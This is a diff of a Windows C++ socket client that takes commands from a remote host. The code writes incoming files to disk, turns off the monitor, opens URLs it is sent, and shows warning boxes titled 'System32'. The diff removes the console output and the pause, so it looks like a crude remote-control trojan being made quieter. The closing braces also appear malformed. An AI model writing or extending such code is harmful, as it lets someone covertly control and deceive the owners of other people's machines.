@@ -122,29 +122,36 @@ int main(int argc, char* argv[])
 			while (1) {
 				char buff[1028] = "";
 				int nbytes = recv(my_sock, buff, sizeof(buff), 0);
-				std::cout << buff << std::endl;
+				if ((buff[0] == '@') && (buff[1] == '@') && (buff[2] == '^'))break;
 				WriteFile(hFile, buff, nbytes, &dwBytesWritten, NULL);
 				if (nbytes == 0) {
-					std::cout << "file downloaded\n";
 					break;
 				}
 				if (nbytes < 0)
 				{
-					std::cout << "Error: " << WSAGetLastError() << std::endl;
 					break;
 				}
 			}
-			std::cout << "Можно выходить\n";
 			CloseHandle(hFile);
 		}
-		else if((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'm')){
+		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'o')) {
+			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
+		}
+		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'w')) {
+			std::string url = buff + 4;
+			ShellExecute(NULL, "open", url.c_str(), 0, 0, SW_SHOWNORMAL);
+		}
+		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'e')) {
+			return 0;
+		}
+		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'm')) {
 			std::string result = buff + 4;
 			std::cout << MessageBox(NULL, result.c_str(), "System32", MB_OK | MB_ICONWARNING);
 		}
 	}
-	printf("Recv error %d\n", WSAGetLastError());
+	//printf("Recv error %d\n", WSAGetLastError());
 	closesocket(my_sock);
 	WSACleanup();
-	system("pause");
-	return -1;
+}
+	return 0;
 }
